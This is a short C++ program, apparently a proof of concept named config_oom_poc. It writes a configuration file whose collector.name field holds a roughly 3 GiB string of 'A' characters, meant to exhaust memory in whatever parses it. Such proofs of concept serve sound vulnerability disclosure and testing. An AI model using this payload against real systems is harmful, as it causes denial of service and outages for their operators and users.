#include <cstdint>
#include <fstream>
#include <iostream>
#include <string>

int main(int argc, char** argv) {
    if (argc != 2) {
        std::cerr << "usage: config_oom_poc <output-file>\n";
        return 2;
    }

    std::ofstream out(argv[1], std::ios::binary | std::ios::trunc);
    if (!out) {
        std::cerr << "failed to open output\n";
        return 1;
    }

    const std::string prefix = "collector.name = \"";
    const std::string chunk(1024 * 1024, 'A');
    out.write(prefix.data(), static_cast<std::streamsize>(prefix.size()));

    for (std::uint32_t i = 0; i < 3072; ++i) {
        out.write(chunk.data(), static_cast<std::streamsize>(chunk.size()));
        if (!out) {
            std::cerr << "failed while writing payload\n";
            return 1;
        }
    }

    const std::string suffix = "\"\n";
    out.write(suffix.data(), static_cast<std::streamsize>(suffix.size()));
    return out ? 0 : 1;
}
